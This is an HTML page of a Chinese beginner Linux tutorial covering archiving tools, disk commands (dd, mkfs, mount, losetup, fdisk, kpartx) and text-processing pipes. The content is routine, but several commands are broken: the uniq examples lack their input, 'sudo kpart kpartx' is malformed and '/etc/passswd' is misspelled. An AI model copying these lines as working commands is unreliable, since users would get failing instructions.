<td style="text-align:left">bzip2程序压缩的文件</td>
</tr>
<tr>
<td>*.tar.gz</td>
<td style="text-align:left">tar打包，gzip程序压缩的文件</td>
</tr>
<tr>
<td>*.tar.xz</td>
<td style="text-align:left">tar打包，xz程序压缩的文件</td>
</tr>
<tr>
<td>*tar.bz2</td>
<td style="text-align:left">tar打包，bzip2程序压缩的文件</td>
</tr>
<tr>
<td>*.tar.7z</td>
<td style="text-align:left">tar打包，7z程序压缩的文件</td>
</tr>
</tbody>
</table>
<h3 id="zip压解打包程序"><a href="#zip压解打包程序" class="headerlink" title="zip压解打包程序"></a>zip压解打包程序</h3><ul>
<li>使用zip打包文件包</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ zip -r -q -o shiyanlou.zip /home/shiyanlou    #-r参数表示递归打包包含子目录的全部内容，-q参数表示为安静模式，即不向屏幕输出信息，-o，表示输出文件，需在其后紧跟打包输出文件名</div><div class="line">$ du -h shiyanlou.zip    #du命令查看打包后文件的大小</div><div class="line">$ file shiyanlou.zip</div></pre></td></tr></table></figure>
<ul>
<li>设置压缩级别为9和1（9最大，1最小），重新打包：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ zip -r -9 -q -o shiyanlou_9.zip /home/shiyanlou -x ~/*.zip     #设置压缩级别-[1-9]</div><div class="line">$ zip -r -1 -q -o shiyanlou_1.zip /home/shiyanlou -x ~/*.zip     #1表示最快压缩但体积大，9表示体积最小但耗时最久</div><div class="line">$ du -h -d 0 *.zip ~ | sort      #du命令分别查看默认压缩级别、最低、最高压缩级别及未压缩的文件的大小</div></pre></td></tr></table></figure>
<ul>
<li>创建加密zip包</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ zip -r -e -o shiyanlou_encryption.zip /home/shiyanlou   #-e参数可以创建加密压缩包</div><div class="line">$ zip -r -l -o shiyanlou.zip /home/shiyanlou              #-l参数将LF转换为CR+LF</div></pre></td></tr></table></figure>
<p>在 Windows 为 CR+LF（Carriage-Return+Line-Feed：回车加换行），而在 Linux/Unix 上为 LF（换行），所以如果在不加处理的情况下，在 Linux 上编辑的文本，在 Windows 系统上打开可能看起来是没有换行的。</p>
<h3 id="使用unzip命令解压缩zip文件"><a href="#使用unzip命令解压缩zip文件" class="headerlink" title="使用unzip命令解压缩zip文件"></a>使用unzip命令解压缩zip文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ unzip shiyanlou.zip                    #将shiyanlou.zip解压到当前目录</div><div class="line">$ unzip -q shiyanlou.zip -d ziptest      #安静模式，将文件解压到指定目录</div><div class="line">$ unzip -l shiyanlou.zip                 #仅查看压缩包的内容</div><div class="line">unzip -O GBK 中文压缩文件.zip            #使用-O 参数指定编码类型</div></pre></td></tr></table></figure>
<h3 id="rar打包压缩命令"><a href="#rar打包压缩命令" class="headerlink" title="rar打包压缩命令"></a>rar打包压缩命令</h3><ul>
<li>安装rar和unrar工具</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get update              </div><div class="line">$ sudo apt-get install rar unrar</div></pre></td></tr></table></figure>
<ul>
<li>从指定文件或目录创建压缩包或添加文件到压缩包</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ rm *.zip               #a参数添加一个目录～到一个归档文件中，如果该文件不存在就会自动创建</div><div class="line">$ rar a shiyanlou.rar</div></pre></td></tr></table></figure>
<p><code>注意：rar 的命令参数没有-，如果加上会报错</code></p>
<ul>
<li>从指定压缩包文件中删除某个文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ rar d shiyanlou.rar .zshrc</div></pre></td></tr></table></figure>
<ul>
<li><p>查看不解压文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ rar l shiyanlou.rar</div></pre></td></tr></table></figure>
</li>
<li><p>使用unrar解压rar文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ unrar x shiyanlou.rar			#全路径解压</div></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ mkdir tmp						#去路径解压</div><div class="line">$ unrar e shiyanlou.rar tmp/</div></pre></td></tr></table></figure>
<h3 id="tar打包工具"><a href="#tar打包工具" class="headerlink" title="tar打包工具"></a>tar打包工具</h3><ul>
<li>创建一个tar包<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tar -cf shiyanlou.tar ~</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/6-4.png" alt=""><br><code>-c</code>表示创建一个 tar 包文件，<code>-f</code>用于指定创建的文件名，注意文件名必须紧跟在<code>-f</code>参数之后，比如不能写成<code>tar -fc shiyanlou.tar</code>，可以写成<code>tar -f shiyanlou.tar -c ~</code>。你还可以加上<code>-v</code>参数以可视的的方式输出打包的文件。上面会自动去掉表示绝对路径的<code>/</code>，你也可以使用<code>-P</code>保留绝对路径符。</p>
<ul>
<li><p>解包一个文件（-x参数）到指定路径的已存在目录（-C参数）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ mkdir tardir</div><div class="line">$ tar -xf shiyanlou.tar -C tardir</div></pre></td></tr></table></figure>
</li>
<li><p>只查看不解包文件-t参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tar -tf shiyanlou.tar</div></pre></td></tr></table></figure>
</li>
<li><p>保留文件属性和跟随链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tar -cphf etc.tar /etc    #还原时希望保留文件的属性(-p参数)和备份链接指向的源文件而不是链接本身(-h参数)</div></pre></td></tr></table></figure>
</li>
<li><p>创建tar文件的基础上添加-z参数，使用gzip来压缩文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tar -czf shiyanlou.tar.gz ~</div></pre></td></tr></table></figure>
</li>
<li><p>解压*.tar.gz文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tar -xzf shiyanlou.tar.gz</div></pre></td></tr></table></figure>
</li>
</ul>
<table>
<thead>
<tr>
<th>文件后缀名</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>*.tar.gz</td>
<td style="text-align:left">-z</td>
</tr>
<tr>
<td>*.tar.xz</td>
<td style="text-align:left">-J</td>
</tr>
<tr>
<td>*.tar.bz2</td>
<td style="text-align:left">-j</td>
</tr>
</tbody>
</table>
<h1 id="文件系统操作与磁盘管理"><a href="#文件系统操作与磁盘管理" class="headerlink" title="文件系统操作与磁盘管理"></a>文件系统操作与磁盘管理</h1><h2 id="简单文件系统操作"><a href="#简单文件系统操作" class="headerlink" title="简单文件系统操作"></a>简单文件系统操作</h2><h3 id="查看磁盘和目录的容量"><a href="#查看磁盘和目录的容量" class="headerlink" title="查看磁盘和目录的容量"></a>查看磁盘和目录的容量</h3><h4 id="使用df命令查看磁盘的容量"><a href="#使用df命令查看磁盘的容量" class="headerlink" title="使用df命令查看磁盘的容量"></a>使用df命令查看磁盘的容量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ df</div></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<p>“rootfs” : （Root File System）它是 Ramfs（Ramfs 是一个非常简单的 Linux 文件系统用于实现磁盘缓存机制作为动态可调整大小的基于 ram 的文件系统）或者 tmpfs 的一个特殊实例，它作为系统启动时内核载入内存之后，在挂载真正的的磁盘之前的一个临时文件系统。通常的主机会在系统启动后用磁盘上的文件系统替换，只是在一些嵌入式系统中会只存在一个 rootfs ，或者像我们目前遇到的情况运行在虚拟环境中共享主机资源的系统也可能会采用这种方式。</p>
</blockquote>
</blockquote>
<p>物理主机上的 /dev/sda2 是对应着主机硬盘的分区，后面的数字表示分区号，数字前面的字母 a 表示第几块硬盘（也可能是可移动磁盘）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ df -h   #查看主机磁盘的使用情况</div></pre></td></tr></table></figure>
<h4 id="使用du命令查看目录的容量"><a href="#使用du命令查看目录的容量" class="headerlink" title="使用du命令查看目录的容量"></a>使用du命令查看目录的容量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 默认同样以 blocks 的大小展示</div><div class="line">$ du </div><div class="line"># 加上`-h`参数，以更易读的方式展示</div><div class="line">$ du -h</div></pre></td></tr></table></figure>
<p><code>-d</code>参数指定查看目录的深度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 只查看1级目录的信息</div><div class="line">$ du -h -d 0 ~</div><div class="line"># 查看2级</div><div class="line">$ du -h -d 1 ~</div></pre></td></tr></table></figure></p>
<h2 id="简单磁盘管理"><a href="#简单磁盘管理" class="headerlink" title="简单磁盘管理"></a>简单磁盘管理</h2><h3 id="dd命令简介"><a href="#dd命令简介" class="headerlink" title="dd命令简介"></a>dd命令简介</h3><p><code>dd</code>命令用于转换和复制文件，不过它的复制不同于<code>cp</code>。之前提到过关于 Linux 的很重要的一点，<strong>一切即文件</strong>，在 Linux 上，硬件的设备驱动（如硬盘）和特殊设备文件（如<code>/dev/zero</code>和<code>/dev/random</code>）都像普通文件一样，只要在各自的驱动程序中实现了对应的功能，dd 也可以读取自和/或写入到这些文件。这样，<code>dd</code>也可以用在备份硬件的引导扇区、获取一定数量的随机数据或者空数据等任务中。<code>dd</code>程序也可以在复制时处理数据，例如转换字节序、或在 ASCII 与  EBCDIC 编码间互换。</p>
<p><code>dd</code>的命令行语句与其他的 Linux 程序不同，因为它的命令行选项格式为<code>选项=值</code>，而不是更标准的<code>--选项 值</code>或<code>-选项=值</code>。<code>dd</code>默认从标准输入中读取，并写入到标准输出中，但可以用选项<code>if</code>（input file，输入文件）和<code>of</code>（output file，输出文件）改变。</p>
<p>我们先来试试用<code>dd</code>命令从标准输入读入用户输入到标准输出或者一个文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 输出到文件</div><div class="line">$ dd of=test bs=10 count=1 # 或者 dd if=/dev/stdin of=test bs=10 count=1</div><div class="line"># 输出到标准输出</div><div class="line">$ dd if=/dev/stdin of=/dev/stdout bs=10 count=1</div></pre></td></tr></table></figure>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/7-5.png/logoblackfont" alt=""><br>上述命令从标准输入设备读入用户输入（缺省值，所以可省略）然后输出到 test 文件，<code>bs</code>（block size）用于指定块大小（缺省单位为 Byte，也可为其指定如’K’，’M’，’G’等单位），<code>count</code>用于指定块数量。如上图所示，我指定只读取总共 10 个字节的数据，当我输入了“hello shiyanlou”之后加上空格回车总共 16 个字节（一个英文字符占一个字节）内容，显然超过了设定大小。使用和<code>du</code>和<code>cat</code>命令看到的写入完成文件实际内容确实只有 10 个字节（那个黑底百分号表示这里没有换行符）,而其他的多余输入将被截取并保留在标准输入。 前面说到<code>dd</code>在拷贝的同时还可以实现数据转换，那下面就举一个简单的例子：将输出的英文字符转换为大写再写入文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ dd if=/dev/stdin of=test bs=10 count=1 conv=ucase</div></pre></td></tr></table></figure>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/7-6.png/logoblackfont" alt=""></p>
<h3 id="使用dd命令创建虚拟镜像文件"><a href="#使用dd命令创建虚拟镜像文件" class="headerlink" title="使用dd命令创建虚拟镜像文件"></a>使用dd命令创建虚拟镜像文件</h3><p>从<code>/dev/zero</code>设备创建一个容量为 256M 的空文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ dd if=/dev/zero of=virtual.img bs=1M count=256</div><div class="line">$ du -h virtual.img</div></pre></td></tr></table></figure></p>
<h3 id="使用mkfs命令格式化磁盘"><a href="#使用mkfs命令格式化磁盘" class="headerlink" title="使用mkfs命令格式化磁盘"></a>使用mkfs命令格式化磁盘</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo mkfs.ext4 virtual.img     #虚拟磁盘镜像格式化为ext4文件系统</div></pre></td></tr></table></figure>
<h3 id="使用mount命令挂载磁盘到目录树"><a href="#使用mount命令挂载磁盘到目录树" class="headerlink" title="使用mount命令挂载磁盘到目录树"></a>使用mount命令挂载磁盘到目录树</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo mount           #查看主机已挂载的文件系统</div></pre></td></tr></table></figure>
<p>mount命令的一般格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount [-o [操作选项]] [-t 文件系统类型] [-w|--rw|--ro] [文件系统源] [挂载点]</div></pre></td></tr></table></figure></p>
<p>常用操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount [-o [操作选项]] [-t 文件系统类型] [-w|--rw|--ro] [文件系统源] [挂载点]</div></pre></td></tr></table></figure></p>
<p>挂载到/mnt目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ mount -o loop -t ext4 virtual.img /mnt </div><div class="line"># 也可以省略挂载类型，很多时候 mount 会自动识别</div><div class="line"></div><div class="line"># 以只读方式挂载</div><div class="line">$ mount -o loop --ro virtual.img /mnt</div><div class="line"># 或者mount -o loop,ro virtual.img /mnt</div></pre></td></tr></table></figure></p>
<blockquote>
<blockquote>
<p>在类 UNIX 系统中，/dev/loop（或称vnd （vnode disk）、lofi（循环文件接口））是一种伪设备，这种设备使得文件可以如同块设备一般被访问。在使用之前，循环设备必须与现存文件系统上的文件相关联。这种关联将提供给用户一个应用程序接口，接口将允许文件视为块特殊文件（参见设备文件系统）使用。因此，如果文件中包含一个完整的文件系统，那么这个文件就能如同磁盘设备一般被挂载。这种设备文件经常被用于光盘或是磁盘镜像。通过循环挂载来挂载包含文件系统的文件，便使处在这个文件系统中的文件得以被访问。这些文件将出现在挂载点目录。如果挂载目录中本身有文件，这些文件在挂载后将被禁止使用。</p>
</blockquote>
</blockquote>
<h3 id="使用umount命令卸载已挂载磁盘"><a href="#使用umount命令卸载已挂载磁盘" class="headerlink" title="使用umount命令卸载已挂载磁盘"></a>使用umount命令卸载已挂载磁盘</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 命令格式 sudo umount 已挂载设备名或者挂载点，如：</div><div class="line">$ sudo umount /mnt</div></pre></td></tr></table></figure>
<h3 id="使用fdisk为磁盘分区"><a href="#使用fdisk为磁盘分区" class="headerlink" title="使用fdisk为磁盘分区"></a>使用fdisk为磁盘分区</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 查看硬盘分区表信息</div><div class="line">$ sudo fdisk -l</div></pre></td></tr></table></figure>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/7-12.png/logo" alt=""></p><p></p>
<p>输出结果中开头显示了主机上的磁盘的一些信息，包括容量扇区数，扇区大小，I/O 大小等信息。</p>
<p>/dev/sda1，/dev/sda2 为主分区分别安装了 Windows 和 Linux 操作系统，/dev/sda3 为交换分区（可以理解为虚拟内存），/dev/sda4 为扩展分区其中包含 /dev/sda5，/dev/sda6，/dev/sda7，/dev/sda8 四个逻辑分区，因为主机上有几个分区之间有空隙，没有对齐边界扇区,所以分区之间的不是完全连续的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 进入磁盘分区模式</div><div class="line">$ sudo fdisk virtual.img</div></pre></td></tr></table></figure>
<h3 id="使用lostup命令建立镜像与回环设备的关联"><a href="#使用lostup命令建立镜像与回环设备的关联" class="headerlink" title="使用lostup命令建立镜像与回环设备的关联"></a>使用lostup命令建立镜像与回环设备的关联</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ sudo losetup /dev/loop0 virtual.img</div><div class="line"># 如果提示设备忙你也可以使用其它的回环设备，&quot;ls /dev/loop*&quot;参看所有回环设备</div><div class="line"></div><div class="line"># 解除设备关联</div><div class="line">$ sudo losetup -d /dev/loop0</div></pre></td></tr></table></figure>
<p>然后再使用<code>mkfs</code>格式化各分区（前面我们是格式化整个虚拟磁盘镜像文件或磁盘），不过格式化之前，我们还要为各分区建立虚拟设备的映射，用到<code>kpartx</code>工具，需要先安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install kpartx</div><div class="line">$ sudo kpart kpartx -av /dev/loop0</div><div class="line"></div><div class="line"># 取消映射</div><div class="line">$ sudo kpart kpartx -dv /dev/loop0</div></pre></td></tr></table></figure>
<pre><code>![](https://dn-anything-about-doc.qbox.me/linux_base/7-15.png)

接着再是格式化，我们将其全部格式化为 ext4：
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ sudo mkfs.ext4 -q /dev/mapper/loop0p1</div><div class="line">$ sudo mkfs.ext4 -q /dev/mapper/loop0p5</div><div class="line">$ sudo mkfs.ext4 -q /dev/mapper/loop0p6</div></pre></td></tr></table></figure>
<pre><code>格式化完成后在`/media`目录下新建四个空目录用于挂载虚拟磁盘：
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ mkdir -p /media/virtualdisk_&#123;1..3&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># 挂载磁盘分区</div><div class="line">$ sudo mount /dev/mapper/loop0p1 /media/virtualdisk_1</div><div class="line">$ sudo mount /dev/mapper/loop0p5 /media/virtualdisk_2</div><div class="line">$ sudo mount /dev/mapper/loop0p6 /media/virtualdisk_3</div><div class="line"></div><div class="line"># 卸载磁盘分区</div><div class="line">$ sudo umount /dev/mapper/loop0p1</div><div class="line">$ sudo umount /dev/mapper/loop0p5</div><div class="line">$ sudo umount /dev/mapper/loop0p6</div></pre></td></tr></table></figure>
<pre><code>然后：
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ df -h</div></pre></td></tr></table></figure>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/7-16.png" alt=""></p>
<h1 id="命令执行顺序控制与管道"><a href="#命令执行顺序控制与管道" class="headerlink" title="命令执行顺序控制与管道"></a>命令执行顺序控制与管道</h1><h2 id="命令执行顺序的控制"><a href="#命令执行顺序的控制" class="headerlink" title="命令执行顺序的控制"></a>命令执行顺序的控制</h2><h3 id="顺序执行多条命令"><a href="#顺序执行多条命令" class="headerlink" title="顺序执行多条命令"></a>顺序执行多条命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get update</div><div class="line"># 等待——————————然后输入下面的命令</div><div class="line">$ sudo apt-get install some-tool</div><div class="line"># 等待——————————然后输入下面的命令</div><div class="line">$ some-tool</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get update;sudo apt-get install some-tool;some-tool</div><div class="line"># 让它自己运行</div></pre></td></tr></table></figure>
<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>管道是什么,管道是一种通信机制，通常用于进程间的通信（也可通过socket进行网络通信），它表现出来的形式就是将前面每一个进程的输出(stdout)直接作为下一个进程的输入(stdin)。管道又分为匿名管道和具名管道（这里将不会讨论在源程序中使用系统调用创建并使用管道的情况，它与命令行的管道在内核中实际都是采用相同的机制）。我们在使用一些过滤程序时经常会用到的就是匿名管道，在命令行中由<code>|</code>分隔符表示，<code>|</code>在前面的内容中我们已经多次使用到了。具名管道简单的说就是有名字的管道，通常只会在源程序中用到具名管道。下面我们就将通过一些常用的可以使用管道的”过滤程序”来帮助你熟练管道的使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ls -al /etc | less       #过管道将前一个命令(ls)的输出作为下一个命令(less)的输入</div></pre></td></tr></table></figure>
<h3 id="cut命令，打印每一行的某一个字段"><a href="#cut命令，打印每一行的某一个字段" class="headerlink" title="cut命令，打印每一行的某一个字段"></a>cut命令，打印每一行的某一个字段</h3><p>打印/etc/passwd文件中以:为分隔符的第1个字段和第6个字段分别表示用户名和其家目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cut /etc/passwd -d &apos;:&apos; -f 1,6</div></pre></td></tr></table></figure>
<p>打印/etc/passwd文件中每一行的前N个字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># 前五个（包含第五个）</div><div class="line">$ cut /etc/passwd -c -5</div><div class="line"># 前五个之后的（包含第五个）</div><div class="line">$ cut /etc/passwd -c 5-</div><div class="line"># 第五个</div><div class="line">$ cut /etc/passwd -c 5</div><div class="line"># 2到5之间的（包含第五个）</div><div class="line">$ cut /etc/passwd -c 2-5</div></pre></td></tr></table></figure>
<h3 id="grep命令，在文本中或stdin中查找匹配字符串"><a href="#grep命令，在文本中或stdin中查找匹配字符串" class="headerlink" title="grep命令，在文本中或stdin中查找匹配字符串"></a>grep命令，在文本中或stdin中查找匹配字符串</h3><p>grep命令的一般形式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep [命令选项]... 用于匹配的表达式 [文件]...</div></pre></td></tr></table></figure></p>
<p>搜索/home/shiyanlou目录下所有包含”shiyanlou”的所有文本文件，并显示出现在文本中的行号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ grep -rnI &quot;shiyanlou&quot; ~            #-r 参数表示递归搜索子目录中的文件,-n表示打印匹配项行号，-I表示忽略二进制文件</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 查看环境变量中以&quot;yanlou&quot;结尾的字符串</div><div class="line">$ export | grep &quot;.*yanlou$&quot;           #其中$就表示一行的末尾。</div></pre></td></tr></table></figure>
<h3 id="wc命令"><a href="#wc命令" class="headerlink" title="wc命令"></a>wc命令</h3><p>wc 命令用于统计并输出一个文件中行、单词和字节的数目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ wc /etc/passwd</div></pre></td></tr></table></figure></p>
<p>分别只输出行数、单词数、字节数、字符数和输入文本中最长一行的字节数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># 行数</div><div class="line">$ wc -l /etc/passwd</div><div class="line"># 单词数</div><div class="line">$ wc -w /etc/passwd</div><div class="line"># 字节数</div><div class="line">$ wc -c /etc/passwd</div><div class="line"># 字符数</div><div class="line">$ wc -m /etc/passwd</div><div class="line"># 最长行字节数</div><div class="line">$ wc -L /etc/passwd</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ls -dl /etc/*/ | wc -l       #结合管道来操作一下，统计 /etc 下面所有目录数</div></pre></td></tr></table></figure>
<h3 id="sort排序命令"><a href="#sort排序命令" class="headerlink" title="sort排序命令"></a>sort排序命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ cat /etc/passswd | sort                #默认为字典排序</div><div class="line">$ cat /etc/passwd | sort -r              #反转排序</div><div class="line">$ cat /etc/passwd | sort -t&apos;:&apos; -k 3      #按特定字段排序</div></pre></td></tr></table></figure>
<p>-t参数用于指定字段的分隔符，这里是以”:”作为分隔符；-k 字段号用于指定对哪一个字段进行排序。这里/etc/passwd文件的第三个字段为数字，默认情况下是一字典序排序的，如果要按照数字排序就要加上-n参数</p>
<h3 id="uniq去重命令"><a href="#uniq去重命令" class="headerlink" title="uniq去重命令"></a>uniq去重命令</h3><ul>
<li>过滤重复行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">|         |         | uniq</div></pre></td></tr></table></figure>
<ul>
<li>输出重复行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 输出重复过的行（重复的只输出一个）及重复次数</div><div class="line"> |         |         | uniq -dc</div><div class="line"># 输出所有重复的行</div><div class="line"> |         |         | uniq -D</div></pre></td></tr></table></figure>
<h1 id="简单的文本处理"><a href="#简单的文本处理" class="headerlink" title="简单的文本处理"></a>简单的文本处理</h1><h2 id="文本处理命令"><a href="#文本处理命令" class="headerlink" title="文本处理命令"></a>文本处理命令</h2><h3 id="tr-命令"><a href="#tr-命令" class="headerlink" title="tr 命令"></a>tr 命令</h3><p>tr 命令可以用来删除一段文本信息中的某些文字。或者将其进行转换。</p>
<table>
<thead>
<tr>
<th>选项</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td style="text-align:left">删除和set1匹配的字符，注意不是全词匹配也不是按字符顺序匹配</td>
</tr>
<tr>
<td>-s</td>
<td style="text-align:left">去除set1指定的在输入文本中连续并重复的字符</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># 删除 &quot;hello shiyanlou&quot; 中所有的&apos;o&apos;,&apos;l&apos;,&apos;h&apos;</div><div class="line">$ echo &apos;hello shiyanlou&apos; | tr -d &apos;olh&apos;</div><div class="line"># 将&quot;hello&quot; 中的ll,去重为一个l</div><div class="line">$ echo &apos;hello&apos; | tr -s &apos;l&apos;</div><div class="line"># 将输入文本，全部转换为大写或小写输出</div><div class="line">$ cat /etc/passwd | tr &apos;[:lower:]&apos; &apos;[:upper:]&apos;</div><div class="line"># 上面的&apos;[:lower:]&apos; &apos;[:upper:]&apos;你也可以简单的写作&apos;[a-z]&apos; &apos;[A-Z]&apos;,当然反过来将大写变小写也是可以的</div></pre></td></tr></table></figure>
<h3 id="col-命令"><a href="#col-命令" class="headerlink" title="col 命令"></a>col 命令</h3><p>col 命令可以将Tab换成对等数量的空格建，或反转这个操作。</p>
<table>
<thead>
<tr>
<th>选项</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-x</td>
<td style="text-align:left">将Tab转换为空格</td>
</tr>
<tr>
<td>-h</td>
<td style="text-align:left">将空格转换为Tab（默认选项）</td>
</tr>
</tbody>
</table>
